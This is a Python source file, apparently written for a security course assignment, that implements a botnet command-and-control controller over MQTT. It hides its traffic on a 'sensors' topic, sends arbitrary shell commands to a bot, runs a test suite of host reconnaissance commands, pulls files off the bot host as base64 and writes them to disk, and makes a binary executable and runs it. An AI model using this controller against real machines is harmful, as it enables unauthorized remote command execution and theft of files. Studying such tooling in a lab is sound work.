import base64
import time
import paho.mqtt.client as mqtt
from consts import *

# This runs whenever the bot sends a response back to the 'sensors' topic
def on_message(client, userdata, msg):
    #accept messages taht go lik this : f"{BOT_ID}_RES:
    payload = msg.payload.decode()
    if payload.startswith(f"{BOT_ID}_RES:"):
        clean_payload = payload.replace(f"{BOT_ID}_RES: ", "")

        # 1. Handle Binary File Copy (Requirement 5.5)
        if "FILE_B64:" in clean_payload:
            try:
                # Based on your bot's format: FILE_B64:filename:data
                _, filename, b64data = clean_payload.split(":", 2)
                with open(f"copied_{filename}", "wb") as f:
                    f.write(base64.b64decode(b64data))
                print(f"[SYSTEM]: Successfully copied binary file: {filename}")
            except Exception as e:
                print(f"[SYSTEM]: Error decoding binary file: {e}")

if __name__ == '__main__':
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.connect(BROKER, PORT)
    client.subscribe(TOPIC)
    # loop_start() required over loop_forever() to allow sending commands
    client.loop_start()
    print("Controller is ready. Type a command (e.g., 'id', 'w', 'ping'):")
    try:
        while True:
            cmd = input("> ")
            if cmd.lower() == "exit":
                break

            if cmd == "testall":
                print("Testing all Requirements...")
                test_suite = [
                    CMD_ANNOUNCE_BOT, # botStatus, requirement 5.1
                    CMD_WHO_IS_LOGGED_IN, # w, requirement 5.2
                    CMD_LIST_FILES, # ls, requirement 5.3
                    CMD_ID_HOST, # id, requirement 5.4
                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " fileToCopy.txt",  # requirement 5.5
                    CMD_CHMOD_TEST_BINARY, # requirement 5.6
                    CMD_RUN_TEST_BINARY # requirement 5.6
                ]

                for test in test_suite:
                    print(f"[*] Testing: {test}")
                    client.publish(TOPIC, f"{BOT_ID}:{test}")
                    time.sleep(1) # Wait for bot response before next test
                continue
            # Send the command to the broker
            client.publish(TOPIC, f"{BOT_ID}:{cmd}")
            client.publish(TOPIC, cmd)
            # Give bot time to respond
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    client.loop_stop()
    client.disconnect()

